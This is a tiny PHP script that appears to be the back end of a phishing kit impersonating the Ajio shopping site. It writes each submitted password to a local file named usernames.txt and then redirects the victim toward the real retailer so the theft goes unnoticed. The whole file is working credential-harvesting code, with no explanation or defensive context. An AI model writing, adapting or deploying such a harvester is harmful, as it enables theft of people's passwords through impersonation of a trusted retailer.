<?php
file_put_contents("usernames.txt", "Password: " . $_POST["pass"] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://www.ajio.com/
header("Location: $url");
exit();
?>